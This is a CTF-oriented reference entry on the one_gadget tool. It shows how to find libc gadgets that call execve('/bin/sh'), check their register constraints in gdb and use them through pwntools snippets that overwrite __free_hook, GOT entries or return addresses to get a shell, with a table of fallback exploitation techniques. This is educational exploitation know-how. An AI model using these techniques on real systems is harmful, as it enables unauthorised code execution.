---
title: "Tool - one_gadget"
category: pwn
subcategory: exploitation
type: tool
tags: [one-gadget, one_gadget, libc, execve, shell, constraints, ret2libc, magic-gadget, rip-control, glibc, pwn, exploitation, free-hook]
summary: "Finds the addresses in libc that call execve('/bin/sh', ...) directly, and prints the register/memory constraints each one needs."
related: [pwn-triage, pwntools, ropgadget-ropper, gdb-pwndbg-gef]
---

## What it is

Inside every libc there are a handful of code paths that end in `execve("/bin/sh", NULL, NULL)` - typically in `exec_comm` inside the `system` implementation. If you can set RIP to one of them **and** its constraints are satisfied, you get a shell with a single 8-byte write. That is the entire point: when you only control the instruction pointer once and have no room for a ROP chain, a one_gadget is the exploit.

`one_gadget` finds these addresses and, crucially, prints the conditions each one requires.

## Install

```sh
# it is a Ruby gem
gem install one_gadget
# Debian/Kali
sudo apt install one-gadget
# verify
one_gadget --version
```

## The invocations that matter

```sh
# 1. the normal call
one_gadget ./libc.so.6

# 2. raw output (offsets only) for scripting
one_gadget -r ./libc.so.6
one_gadget ./libc.so.6 --raw

# 3. look up by build id, without having the file (queries a local/remote database)
one_gadget -b 1234567890abcdef1234567890abcdef12345678

# 4. specify the libc version instead of a file
one_gadget --version 2.31

# 5. get the build id of a libc you do have
file ./libc.so.6
readelf -n ./libc.so.6 | grep -i 'build id'

# 6. use it from Python
python3 -c "
import subprocess
offs = [int(x, 0) for x in subprocess.check_output(['one_gadget','-r','./libc.so.6']).split()]
print([hex(o) for o in offs])"
```

Typical output:
```
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

Using it:
```python
from pwn import *
libc = ELF("./libc.so.6", checksec=False)
libc.address = leak - libc.sym["puts"]          # set the base from your leak
one = libc.address + 0xe3afe                    # pick the offset one_gadget printed
# then: overwrite __free_hook / a GOT entry / the saved return address with `one`
```

Checking the constraints in gdb - this is the step people skip and then waste an hour:
```sh
gdb -q ./chal
pwndbg> b *<the instruction right before control transfers>
pwndbg> r
pwndbg> i r rsi rdx r12 r15 rsp
pwndbg> x/gx $rsp+0x30        # for constraints of the form [rsp+0x30] == NULL
```

Making a constraint hold:
```python
# many one_gadgets need rdx == 0 or [rsp+0x50] == 0.
# a two-gadget prefix fixes that:
rop = ROP(libc)
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]     # or "xor rdx, rdx; ret"
chain = flat([pop_rdx, 0, one])
```

## Gotchas

- **The constraints are the whole story.** An address that does not satisfy its constraints will `SIGSEGV`, not give a shell. Always verify in gdb at the exact moment of the jump.
- The offsets are **relative to the libc base**. Add `libc.address`; do not use them raw.
- The one_gadget you need must be from **the exact libc the target runs**, byte-identical. Different builds of "glibc 2.31" have different offsets. Use the provided `libc.so.6`, or identify it from a leak with `libc-database`.
- Different calling contexts satisfy different gadgets. If gadget 1 fails, try gadget 2 and 3 - they have different constraints and one often happens to hold.
- Constraints like `[rsp+0x50] == NULL` depend on stack garbage that differs between local and remote. A gadget that works locally may fail remotely.
- Glibc 2.34+ removed `__malloc_hook`/`__free_hook`, so the usual delivery vehicle is gone; you will be jumping from an FSOP or exit-handler primitive instead, with a different register state.
- `one_gadget` needs Ruby. If `gem install` fails, `sudo apt install one-gadget` or run it in a container.
- When every gadget's constraints fail, do not fight it: use a two-write `system("/bin/sh")` or a short ROP chain instead.

## If it fails, use instead

| Situation | Alternative |
|---|---|
| No gadget's constraints hold | `pop rdi; ret` + `/bin/sh` + `system` (3 writes, but no constraints) |
| No room for even 3 values | stack pivot (`leave; ret`, `pop rsp`) into a larger buffer |
| `execve` blocked by seccomp | open/read/write shellcode; `ctfbrain search seccomp` |
| You need to find the libc first | `libc-database`'s `find puts 5f0 printf 800`, or the libc.rip API |
| General gadget search | `ROPgadget`, `ropper` (`ctfbrain search ropgadget-ropper`) |
| You have arbitrary write, many times | write a full ROP chain to the stack via an `environ` leak |
| Static binary (no libc) | `ROPgadget --binary ./chal --ropchain` for a direct `execve` syscall chain |
